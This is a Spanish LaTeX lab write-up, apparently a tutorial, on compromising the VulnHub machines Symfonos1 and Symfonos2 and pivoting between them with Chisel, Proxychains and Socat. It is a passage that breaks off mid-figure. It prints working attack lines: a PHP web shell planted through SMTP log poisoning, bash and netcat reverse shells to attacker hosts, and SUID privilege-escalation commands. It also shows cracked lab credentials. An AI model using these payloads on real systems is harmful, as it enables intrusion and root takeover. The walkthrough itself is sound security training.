@@ -1,0 +1,1067 @@
+\documentclass[12pt]{article}
+
+% Idioma y codificación
+
+\usepackage[spanish]{babel}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{tgheros} % Fuente de letra
+\usepackage{ragged2e} 
+
+% Poner puntitos en el indice
+
+\usepackage{tocloft}
+\renewcommand{\cftsecleader}{\cftdotfill{\cftdotsep}}
+
+% Para imágenes
+
+\usepackage{graphicx}
+\usepackage{float}
+
+% Para titulos de tipo caja
+
+\usepackage{tcolorbox}
+
+% Para reducir el tamaño de las letras de los pie de imagen
+\usepackage{caption}
+\captionsetup{font=footnotesize}
+
+% Para añadir hipervinculos y que sean azules
+\usepackage[colorlinks=true, urlcolor=blue, linkcolor=blue, citecolor=blue]{hyperref}
+
+% Para remarcar comandos en cuadritos
+
+\usepackage{listings}
+\lstset{
+  basicstyle=\ttfamily\small,
+  breaklines=true,
+  frame=single
+}
+
+% Título y autor
+\title{Pivoting Básico en Linux entre las máquinas Symfonos1 y Symfonos2}
+\author{Daniel Damota Maldonado}
+\date{} % fecha vacia
+\setlength{\parindent}{0pt}
+
+%INICIO DEL DOCUMENTO
+
+\begin{document}
+\noindent % Para evitar la sangría inicial de los párrafos
+
+\begin{figure}
+\centering
+\includegraphics[width=0.9\textwidth]{Images/1.png}
+\end{figure}
+
+\maketitle
+
+\newpage % SALTO DE PÁGINA
+
+\tableofcontents
+
+\newpage % SALTO DE PÁGINA
+
+\section{Introducción}
+El objetivo de este documento es explicar de forma clara y práctica el proceso de pivoting 
+básico entre equipos Linux utilizando Proxychains y Chisel con una conexión de tipo SOCKS, todo realizado 
+en un entorno controlado mediante el uso de las máquinas Symfonos1 y Symfonos2 de la plataforma de Vulnhub. 
+Para realizar este proceso, solo tendremos comunicación con la máquina Symfonos1, la cual comunica por otra 
+interfaz de red con la máquina Symfonos2.\\
+
+Se realizará un proceso de pentesting con etapas de enumeración de servicios, explotación de vulnerabilidades y escalada de privilegios
+en ambas máquinas.
+
+\section{Componentes del laboratorio}
+
+\begin{itemize}
+        \item Software de virtualización VMWare Workstation 17.6.4 en Windows.
+        \item Máquina atacante ParrotOS actualizada, con comunicación con la máquina Symfonos1 y personalizada mediante Bspwn.
+        \item Máquinas Symfonos1 y Symfonos2 unidas por una interfaz de red distinta a la de la máquina atacante.
+    \end{itemize}
+
+    \begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{Images/1.1.png}
+    \caption{Diagrama representativo de la estructura del laboratorio.}
+    \end{figure}
+
+\newpage % SALTO DE PÁGINA
+ 
+\section{Técnicas utilizadas}
+
+Enumeración
+     \begin{itemize}
+        \item Enumeración de puertos y servicios con Nmap.
+        \item Enumeración del servicio SMB con Netexec, Smbmap y Smbclient y filtración de información.
+        \item Enumeración web con Wappalizer, Whatweb e información filtrada en el código fuente.
+        \item Búsqueda de vulnerabilidades asociadas.\\
+    \end{itemize}
+
+Explotación
+     \begin{itemize}
+        \item Abuso de Local File Inclusion y SMTP para ejecutar comandos en remoto (Plugin Mail Masta).
+        \item Explotación de ProFTPD 1.3.5 para obtener una copia del /etc/shadow (CVE-2015-3306).\\
+    \end{itemize}
+    
+Escalada de privilegios y Post-Explotación
+     \begin{itemize}
+        \item Abuso de privilegios SUID combinado con Path Hijacking para escalar privilegios a root en Symfonos1.
+        \item Visualización de puertos internos y servicios inaccesibles desde fuera.
+        \item Abuso de una vulnerabilidad de LibreNMS para pivotar de usuario (CVE-2018-20434).
+        \item Abuso de permisos Sudo sobre Mysql para escalar privilegios a root en Symfonos2.\\
+    \end{itemize}
+
+Pivoting
+
+\begin{itemize}
+        \item Creación de un tunel SOCK5 para comunicar con equipos internos mediante Chisel y Proxychains.
+        \item Uso de Socat para crear una conexión reversa a través de Symfonos1\\
+    \end{itemize}
+
+\newpage % SALTO DE PÁGINA
+
+\section{Prueba de penetración de la máquina Symfonos1}
+
+\textbf{Enumeración}\\[2pt]
+
+Iniciamos el proceso de enumeración mediante el escaneo de hosts en la red utilizando la herramienta Nmap:\\
+
+\begin{lstlisting}
+sudo nmap -sn 10.10.10.0/24
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/2.png}
+\caption{Escaneo con nmap para descubrimiento de hosts.}
+\end{figure}
+
+Como podemos ver en la imagen superior, hay varias IP en la red. Podemos descartar la 10.10.10.1 (equipo anfitrión),
+la 10.10.10.180 (Máquina atacante) y la 10.10.10.254 (no hay comunicación), por lo tanto, la IP de la máquina Symfonos1
+es la 10.10.10.130.\\
+
+Realizamos un ping a la 10.10.10.130 para comprobar si se encuentra operativa mediante el envío de un paquete ICMP:
+
+\newpage % SALTO DE PÁGINA
+
+\begin{lstlisting}
+ping -c1 10.10.10.130
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/3.png}
+\caption{Ping enviado a Symfonos1}
+\end{figure}
+
+Ahora sabiendo que tenemos comunicación y que la máquina se encuentra operativa, realizamos un escaneo de puertos
+abiertos con la herramienta Nmap:\\
+
+\begin{lstlisting}
+nmap -sS -Pn -n --open -p- --min-rate 5000 10.10.10.130
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/4.png}
+\caption{Enumeración de puertos abiertos en Symfonos1.}
+\end{figure}
+
+Ahora realizamos un escaneo más específico de los puertos que se han detectado como abiertos, utilizando también
+la herramienta Nmap:
+
+\newpage % SALTO DE PÁGINA
+
+\begin{lstlisting}
+nmap -sCV -p22,25,80,139,445 10.10.10.130 -oN symfonos1
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/5.png}
+\caption{Escaneo exhaustivo de los servicios abiertos}
+\end{figure}
+
+Iniciamos enumerando el servicio SMB (Recursos compartidos) del puerto 445 haciendo uso de las herramientas
+Netexec y Smbmap:\\
+
+\begin{lstlisting}
+netexec smb 10.10.10.130 --shares
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/6.png}
+\caption{Enumeración del servicio SMB de Symfonos1 con Netexec}
+\end{figure}
+
+\begin{lstlisting}
+smbmap -H 10.10.10.130
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/7.png}
+\caption{Enumeración del servicio SMB de Symfonos1 con Smbmap}
+\end{figure}
+
+\newpage % SALTO DE PÁGINA
+
+Con la información extraida de Netexec y Smbmap, vemos que tenemos acceso con permiso de lectura
+a un recurso compartido a nivel de red que se llama Anonymous y que hay un potencial usuario llamado Helios.\\
+
+Probamos a conectarnos por Smbclient al recurso Anonymous y obtenemos los archivos que tengamos accesibles mediante
+el parámetro get:\\
+
+\begin{lstlisting}
+smbclient '\\10.10.10.130\anonymous' -U "" -N
+smb:> ls
+smb:> get attention.txt
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/8.png}
+\caption{Conexión al servicio SMB de Symfonos1 con Smbclient y obtención de recursos}
+\end{figure}
+
+Leemos el contenido de attention.txt:\\
+
+\begin{lstlisting}
+cat attention.txt
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/9.png}
+\caption{Lectura del archivo anteriormente obtenido}
+\end{figure}
+
+\newpage % SALTO DE PÁGINA
+
+Probamos las credenciales expuestas con el usuario Helios mediante la herramienta Smbmap:\\
+
+\begin{lstlisting}
+smbmap -H 10.10.10.130 -u Helios -p epidioko
+smbmap -H 10.10.10.130 -u Helios -p baseball
+smbmap -H 10.10.10.130 -u Helios -p qwerty
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/10.png}
+\caption{Credenciales del usuario Helios obtenidas}
+\end{figure}
+
+Ahora tenemos permiso de lectura del recurso 'helios', por lo que podemos conectarnos mediane Smbclient y obtener los recursos:\\
+
+\begin{lstlisting}
+smbclient '\\10.10.10.130\helios' -U "helios%qwerty"
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/11.png}
+\caption{Conexión al recurso compartido helios mediante smbclient}
+\end{figure}
+
+\newpage % SALTO DE PÁGINA
+
+Leemos el contenido de ambos archivos y podemos ver que se hace referencia a una ruta llamada /h3l105:\\
+
+\begin{lstlisting}
+cat research.txt
+cat todo.txt
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/12.png}
+\caption{Información obtenida del recurso compartido helios}
+\end{figure}
+
+Accedemos al servicio web del puerto 80 y probamos con la ruta /h3l105:\\
+
+\begin{lstlisting}
+http://10.10.10.130/h3l105
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/13.png}
+\caption{Ruta web /h3l105 válida}
+\end{figure}
+
+Revisamos el código fuente de la web y vemos que se hace referencia al dominio symfonos.local:\\
+
+\begin{lstlisting}
+Ctrl + U
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/14.png}
+\caption{Visualización del dominio symfonos.local en el código fuente}
+\end{figure}
+
+\newpage % SALTO DE PÁGINA
+
+Añadimos el dominio en referencia a la IP de la máquina víctima en la ruta /etc/hosts:\\
+
+\begin{lstlisting}
+sudo nano /etc/hosts
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/15.png}
+\caption{Modificación de /etc/hosts para resolver a symfonos.local}
+\end{figure}
+
+Ahora podremos visualizar la ruta web /h3l105 de mejor manera:\\
+
+\begin{lstlisting}
+http://10.10.10.130/h3l105
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.75\textwidth]{Images/16.png}
+\caption{Mejor visualización de la web de Symfonos1}
+\end{figure}
+
+\newpage % SALTO DE PÁGINA
+
+Ahora vamos a realizar una enumeración web de esta ruta para ver si encontramos algo relevante, para ello podemos utilizar
+la herramienta Whatweb (por consola) o Wappalizer (extensión del navegador):\\
+
+\begin{lstlisting}
+whatweb http://10.10.10.130/h3l105
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/17.png}
+\caption{Información de la web obtenida mediante whatweb}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.75\textwidth]{Images/18.png}
+\caption{Información de la web obtenida mediante Wappalizer}
+\end{figure}
+
+\newpage % SALTO DE PÁGINA
+
+Como podemos ver, estamos ante un Wordpress, por lo que podemos empezar comprobando si tenemos acceso a listar los plugins
+para revisar si hay alguno vulnerable:\\
+
+\begin{lstlisting}
+http://10.10.10.130/h3l105/wp-content/plugins
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/19.png}
+\caption{Intento fallido de acceso a /wp-content/plugins}
+\end{figure}
+
+Aunque no podemos listar los plugins, hay alguna información expuesta en el código fuente sobre los plugins utilizados:\\
+
+\begin{lstlisting}
+curl -s -X GET http://symfonos.local/h3l105/ | 
+grep wp-content/plugins | 
+grep -oP "'.*?'" | 
+grep symfonos.local | 
+cut -d '/' -f 1-7 | 
+sort -u
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/20.png}
+\caption{Plugins expuestos en el código fuente}
+\end{figure}
+
+\newpage % SALTO DE PÁGINA
+
+\textbf{Explotación}\\[2pt]
+
+Buscamos vulnerabilidades asociadas y encontramos el siguiente exploit de mail-masta:\\
+
+\begin{lstlisting}
+searchsploit mail masta
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/21.png}
+\caption{Exploits públicos del Plugin Mail Masta}
+\end{figure}
+
+Probamos a realizar el Local File Inclusion para ver si podemos listar recursos internos del sistema:\\
+
+\begin{lstlisting}
+http://10.10.10.130/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/22.png}
+\caption{Lectura del archivo /etc/passwd mediante LFI}
+\end{figure}
+
+Tratamos de leer la clave SSH privada del usuario Helios, pero no nos deja:\\
+
+\begin{lstlisting}
+http://10.10.10.130/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/home/helios/.ssh/id_rsa
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/23.png}
+\caption{Intento fallido de lectura de clave SSH por LFI}
+\end{figure}
+
+Otra opción, teniendo un Local File Inclusion, es tratar de ejecutar comandos en remoto mediante el envenenamiento de logs, para ello 
+podemos seguir pautas generales del siguiente recurso:\\
+\\
+\url{https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet}\\
+
+Sin embargo no tendremos acceso a las rutas, pero cuando probamos con los logs de SMTP del usuario Helios, vemos que tenemos acceso a logs:\\
+
+\begin{lstlisting}
+http://10.10.10.130/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/24.png}
+\caption{Lectura de los logs de correo del usuario Helios}
+\end{figure}
+
+Nos conectamos mediante Telnet al servicio SMTP para ver si podemos introducir código malicioso php en los logs sin autenticación.\\
+
+Para realizar el envenenamiento, seguimos el recurso \url{https://liberty-shell.com/sec/2018/05/19/poisoning/}:\\
+
+\begin{lstlisting}
+MAIL FROM: test
+RCPT TO: helios
+DATA
+<?php system($_GET['cmd']); ?>
+. 
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.8\textwidth]{Images/25.png}
+\caption{Código malicioso PHP enviado al usuario Helios}
+\end{figure}
+
+Ahora tratamos de ejecutar comandos en remoto:\\
+
+\begin{lstlisting}
+curl -s -X GET 'http://10.10.10.130/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=id'| tail -n 2
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.8\textwidth]{Images/26.png}
+\caption{Ejecución remota de comandos mediante envenenamiento de logs}
+\end{figure}
+
+Ahora conseguimos el acceso mediante la ejecución de una reverse shell y en la máquina atacante nos ponemos en escucha con netcat:\\
+
+\begin{lstlisting}
+sudo netcat -lvnp 443
+
+cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.10.128/443+0>%261"'
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.8\textwidth]{Images/27.png}
+\caption{Reverse shell mediante envenenamiento de logs}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.8\textwidth]{Images/28.png}
+\caption{Evidencia de acceso remoto al equipo Symfonos1}
+\end{figure}
+
+\vspace{2em} % espacio vertical opcional
+
+\textbf{Escalada de privilegios}\\[2pt]
+
+Realizamos una enumeración de posibles vectores de escalada de privilegios en Linux, para ello podemos seguir el siguiente recurso:
+\url{https://github.com/Ignitetechnologies/Linux-Privilege-Escalation?tab=readme-ov-file}\\
+
+Cuando enumeramos permisos SUID, encontramos uno distinto a lo común:\\
+
+\newpage
+
+\begin{lstlisting}
+find / -perm -4000 -user root 2>/dev/null
+
+/opt/statuscheck
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.8\textwidth]{Images/29.png}
+\caption{Enumeración de binarios con permisos SUID}
+\end{figure}
+
+Si analizamos el comportamiento del archivo y lo ejecutamos, veremos una respuesta idéntica a la ejecución de curl -I:\\
+
+\begin{lstlisting}
+cd /opt
+
+./statuscheck
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.8\textwidth]{Images/30.png}
+\caption{Ejecución del binario con permisos SUID}
+\end{figure}
+
+\newpage
+
+Analizamos el contenido del binario mediante strings:\\
+
+\begin{lstlisting}
+strings statuscheck
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.8\textwidth]{Images/31.png}
+\caption{Visualización del contenido del binario statuscheck}
+\end{figure}
+
+Si nos fijamos bien, se está ejecutando un curl sin hacer referencia a la ruta absoluta en la que reside, por lo que podemos
+probar a realizar PATH HIJACKING, siguiendo el recurso:\\
+
+\url{https://github.com/Ignitetechnologies/Linux-Privilege-Escalation?tab=readme-ov-file}\\
+
+\newpage
+
+\begin{lstlisting}
+cd /tmp
+echo "chmod u+s /bin/bash" > curl
+chmod 755 curl
+export PATH=/tmp:$PATH
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.8\textwidth]{Images/32.png}
+\caption{Realización de escalada de privilegios mediante PATH Hijacking}
+\end{figure}
+
+Ahora que hemos dados permisos SUID a la bash, podemos enviarnos una bash como root:\\
+
+\begin{lstlisting}
+bash -p
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/33.png}
+\caption{Evidencia de escalada de privilegios a root}
+\end{figure}
+
+\newpage
+
+\section{Pivoting mediante Chisel y Proxychains}
+
+Ahora que hemos comprometido la máquina Symfonos1, visualiazmos otras interfaces de red para ver si podemos pivotar:\\
+
+\begin{lstlisting}
+ip a
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/34.png}
+\caption{Enumeración de interfaces de red de Symfonos1}
+\end{figure}
+
+Como podemos observar en la imagen anterior, hay otra interfaz de red a la cual no tenemos acceso inicial.\\
+
+Vamos a realizar una conexión de tipo SOCKS5 para poder comunicarnos con máquinas de la interfaz interna, haciendo uso de Chisel.\\
+
+Ahora vamos a descargar el binario de chisel desde su repositorio oficial:\\
+
+\url{https://github.com/jpillora/chisel/releases}\\
+
+\begin{lstlisting}
+mv chisel_1.11.3_linux_amd64.gz chisel.gz
+gunzip chisel.gz
+chmod +x chisel
+./chisel server --reverse -p 1234
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/35.png}
+\caption{Conexión reversa con chisel en la máquina atacante como servidor}
+\end{figure}
+
+Pasamos el archivo a la máquina víctima mediante http y nos conectamos como clientes a la máquina víctima con Chisel:\\
+
+\begin{lstlisting}
+En la maquina atacante: 
+
+python3 -m http.server 80
+
+En la maquina victima: 
+
+wget http://10.10.10.128/chisel
+
+./chisel client 10.10.10.128:1234 R:socks
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/36.png}
+\caption{Conexión con Chisel por parte de la máquina víctima}
+\end{figure}
+
+\newpage
+
+Ahora editamos el archivo /etc/proxychains.conf para añadir la configuración del túnel SOCKS5, poniendo la Ip y puerto que
+sale en la máquina atacante tras realizar la conexión por parte del cliente:\\
+
+\begin{lstlisting}
+    sudo nano /etc/proxychains.conf
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.75\textwidth]{Images/37.png}
+    \caption{Configuración de Proxychains.conf}
+\end{figure}
+
+Los escaneos de hosts a través de proxychains pueden ser lentos y poco precisos, por lo que podemos crear un script en bash para 
+reconocimiento de hosts y ejecutarlo en Symfonos1:\\
+
+\begin{lstlisting}
+    ./scan.sh
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{Images/38.png}
+    \caption{Script en bash de reconocimiento de hosts}
+\end{figure}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{Images/39.png}
+    \caption{Hosts activos en la red 10.10.11.0/24}
+\end{figure}
+
+\newpage
+
+\section{Prueba de penetración de la máquina Symfonos2}
+
+\textbf{Enumeración}\\[2pt]
+
+Teniendo en cuenta que el equipo anfitrion es la 10.10.11.1 y la máquina Symfonos1 es la 10.10.11.130,
+podemos deducir que la 10.10.11.128 es Symfonos2.\\
+
+Realizamos un escaneo de puertos a través de Proxychains con nmap para ver que puertos tiene abiertos:\\
+
+\begin{lstlisting}
+proxychains nmap -sT -Pn -n -p- --open -T5 10.10.11.128 2>/dev/null
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/40.png}
+\caption{Enumeración de puertos en Symfonos2}
+\end{figure}
+
+Ahora realizamos un escaneo más exhaustivo de los puertos abiertos:\\
+
+\begin{lstlisting}
+proxychains nmap -sCV -sT -p21,22,80,139,445 -Pn -n 10.10.11.128 2>/dev/null -oN symfonos2.txt
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/41.png}
+\caption{Escaneo exhaustivo de puertos abiertos en Symfonos2}
+\end{figure}
+
+\newpage
+
+Como primera medida, vamos a enumerar el servicio SMB con Smbmap:\\
+
+\begin{lstlisting}
+proxychains smbmap -H 10.10.11.128 2>/dev/null
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/42.png}
+\caption{Enumeración de SMB de Symfonos2 con Smbmap}
+\end{figure}
+
+Nos conectamos al recurso Anonymous al cual tenemos permiso de lectura y obtenemos los archivos:\\
+
+\begin{lstlisting}
+proxychains smbclient '\\10.10.11.128\Anonymous' -U "" -N 2>/dev/null
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/43.png}
+\caption{Conexión al servicio SMB mediante SmbClient}
+\end{figure}
+
+\newpage
+
+Si analizamos el archivo veremos que hay un potencial usuario llamado aeolus y sabemos la ruta interna que conecta con el 
+recurso compartido Anonymous:\\
+
+\begin{lstlisting}
+cat log.txt
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/44.png}
+\caption{Potencial usuario descubierto en log.txt}
+\end{figure}
+
+También podemos ver que se ha realizado una copia de /etc/shadow en otra ruta del sistema:\\
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/45.png}
+\caption{Posible ruta a una copia del /etc/shadow descubierta}
+\end{figure}
+
+\newpage
+
+\textbf{Eplotación}\\[2pt]
+
+Ya no podemos sacar nada más por parte del servicio SMB, así que podemos enumerar otros servicios del sistema para 
+buscar vulnerabilidades asociadas y vemos que el servicio FTP es vulnerable:\\
+
+\begin{lstlisting}
+searchsploit ProFTPD 1.3.5
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/46.png}
+\caption{Exploits asociados a la versión ftp de symfonos2}
+\end{figure}
+
+Si probamos, veremos que no funcionan los de remote command execution, por lo que ojeamos el de File Copy,
+el cual contiene una prueba de concepto en la que se puede copiar archivos a una ruta de destino sin  estar
+completamente autenticado:\\
+
+\begin{lstlisting}
+cat 36742.txt
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.8\textwidth]{Images/47.png}
+\caption{Vulnerabilidad de copia de archivos internos de forma no autenticada}
+\end{figure}
+
+Podemos realizar la copia de /var/backups/shadow.bak al directorio /home/aeolus/share para poder acceder a la copia del shadow
+por SMB:\\
+
+\begin{lstlisting}
+proxychains ftp 10.10.11.128 2>/dev/null
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/48.png}
+\caption{Explotación de la vulnerabilidad para tratar de obtener shadow.bak}
+\end{figure}
+
+Si todo ha funcionado bien, deberiamos tener shadow.bak accesible mediante SMB:\\
+
+\newpage
+
+\begin{lstlisting}
+proxychains smbclient '10.10.11.128/Anonymous' -U " " -N 2>/dev/null
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/49.png}
+\caption{Evidencia de obtención de shadow.bak}
+\end{figure}
+
+Ahora tratamos de crackear las contraseñas del shadow mediante john the ripper y obtenemos las credenciales de Aeolus:\\
+
+\begin{lstlisting}
+john --wordlist=/usr/share/wordlist/rockyou.txt shadow.bak
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/50.png}
+\caption{Obtención de credenciales del usuario Aeolus}
+\end{figure}
+
+Tratamos de conectarnos por SSH con las credenciales obtenidas a Symfonos2:\\
+
+\newpage
+
+\begin{lstlisting}
+proxychains ssh aeolus@10.10.11.128 2>/dev/null
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/51.png}
+\caption{Conexión remota mediante SSH a Symfonos2}
+\end{figure}
+
+\textbf{Escalada de privilegios}\\[2pt]
+
+Ahora que hemos conseguido acceso remoto al equipo, vamos a tratar de escalar privilegios, para ello
+podemos seguir pautas generales del recurso mencionado en Symfonos1:\\ 
+
+\url{https://github.com/Ignitetechnologies/Linux-Privilege-Escalation?tab=readme-ov-file}\\
+
+Sin embargo en este caso no aplica ninguno de los métodos y lo que debemos hacer es ver si hay algun 
+servicio interno que no fuese accesible dede fuera:\\
+
+\begin{lstlisting}
+ss -tuln
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/52.png}
+\caption{Enumeración de puertos internos}
+\end{figure}
+
+Realizamos Local Port Forwarding con SSH:\\
+
+\begin{lstlisting}
+proxychains ssh -L 8080:127.0.0.1:8080 
+aeolus@10.10.11.128
+
+http://127.0.0.1:8080
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/53.png}
+\caption{Local Port Forwarding por SSH}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.75\textwidth]{Images/54.png}
+\caption{Acceso mediante Local Port Forwarding al puerto 8080 de Symfonos2}
+\end{figure}
+
+Probamos a buscar credenciales por defecto o tratamos de reutilizar las de aeolus:\\
+
+\begin{lstlisting}
+aeolus:sergioteamo
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.70\textwidth]{Images/55.png}
+\caption{Intento de autenticación con las credenciales de aeolus en LibreNMS}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/56.png}
+\caption{Acceso a LibreNMS con credenciales reutilizadas de aeolus}
+\end{figure}
+
+Podemos tratar de primeras de buscar algún exploit asociado a LibreNMS:\\
+
+\begin{lstlisting}
+searchsploit librenms
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/57.png}
+\caption{Exploits públicos de LibreNMS}
+\end{figure}
+
+Leemos el de remote code execution y tratamos de entenderlo para explotarlo manualmente:\\
+
+\newpage
+
+\begin{lstlisting}
+searchsploit -m php/webapps/47044.py
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/58.png}
+\caption{Exploits públicos de LibreNMS}
+\end{figure}
+
+Vemos que el exploit ejecuta un netcat para mandar una shell, en mi caso voy a jugar con socat para enviar la shell
+a la máquina atacante de manera que la Reverse shell viaje a través de Symfonos1 (En caso de 
+que la máquina Symfonos2 no tuviera netcat, pasamos el binario desde la máquina atacante):\\
+
+\begin{lstlisting}
+'$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|
+nc 10.10.11.130 4444 >/tmp/f) #
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/59.png}
+\caption{Pyload malicioso de conexión remota}
+\end{figure}
+
+Nos conectamos a Symfonos1 otra vez para ejecutar Socat, el cual ya viene instalado en la máquina:\\
+
+\begin{lstlisting}
+which socat
+
+socat TCP-LISTEN:4444,fork 10.10.10.128:4444
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/60.png}
+\caption{Uso de Socat para conectar los puertos  4444 de Symfonos1 y el atacante}
+\end{figure}
+
+\newpage
+
+En la máquina atacante nos ponemos a la escucha por el puerto 4444 con netcat:\\
+
+\begin{lstlisting}
+netcat -lvnp 4444
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.75\textwidth]{Images/61.png}
+\caption{Uso de netcat para estar a la escucha de la Reverse Shell}
+\end{figure}
+
+Ahora vamos al apartado para ejecutar el Payload en LibreNMS.\\
+
+El apartado es Devices, clickamos el objeto creado anteriormente, vamos al apartado de Capture y luego a SNMP:\\
+
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/62.png}
+\caption{Uso de Socat para conectar puertos entre Symfonos1 y el atacante}
+\end{figure}
+
+\newpage
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/63.png}
+\caption{Objeto malicioso creado en LibreNMS}
+\end{figure}
+
+Hacemos click en Run y ya deberiamos conseguir al acceso remoto:\\
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/64.png}
+\caption{Evidencia de pivoting de usuario en Symfonos2}
+\end{figure}
+
+Ahora somos el usuario Cronus, vamos a enumerar si este usuario tiene alguna forma de escalar a root.
+
+Cuando enumeramos privilegios de sudo encontramos lo siguiente:\\
+
+\newpage
+
+\begin{lstlisting}
+sudo -l 
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.75\textwidth]{Images/65.png}
+\caption{Privilegio sudo sobre Mysql sin especificar contraseña}
+\end{figure}
+
+Usamos la web de https://gtfobins.github.io/ para ver si podemos escalar a root:\\
+
+\begin{lstlisting}
+sudo mysql -e '\! chmod u+s /bin/bash'
+
+bash -p
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
